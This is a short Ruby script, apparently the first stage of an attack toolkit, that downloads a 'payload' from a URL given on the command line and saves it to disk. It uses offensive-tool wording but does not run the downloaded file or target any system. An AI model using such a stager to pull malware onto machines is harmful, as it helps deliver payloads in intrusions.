require 'net/http'
require 'uri'

def download_payload(url, save_path)
  uri = URI(url)
  print "[*] Downloading payload from #{url}..."
  
  begin
    response = Net::HTTP.get(uri)
    File.write(save_path, response)
    print "[+] Payload saved as #{save_path}"
  rescue => e
    print "[!] Download failed: #{e}"
  end
end

if __FILE__ == $0
  if ARGV.length < 2
    print "[!] Usage: stager <URL> <save path>"
    exit
  end
  download_payload(ARGV[0], ARGV[1])
end